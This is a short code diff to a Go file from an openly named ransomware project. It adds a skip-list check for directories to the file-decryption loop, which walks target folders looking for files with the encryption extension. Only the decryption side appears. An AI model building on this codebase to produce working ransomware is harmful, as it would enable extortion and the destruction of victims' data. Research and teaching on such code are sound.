@@ -12,6 +12,7 @@ import (
 
 	"github.com/mauri870/ransomware/cmd"
 	"github.com/mauri870/ransomware/cryptofs"
+	"github.com/mauri870/ransomware/utils"
 )
 
 func init() {
@@ -71,6 +72,11 @@ func decryptFiles(key string) {
 		// Loop over the interesting directories
 		for _, folder := range cmd.InterestingDirs {
 			filepath.Walk(folder, func(path string, f os.FileInfo, err error) error {
+				if utils.StringInSlice(filepath.Base(path), cmd.SkippedDirs) {
+					cmd.Logger.Printf("Skipping dir %s", path)
+					return filepath.SkipDir
+				}
+
 				ext := filepath.Ext(path)
 				// Matching Files encrypted
 				if ext == cmd.EncryptionExtension {
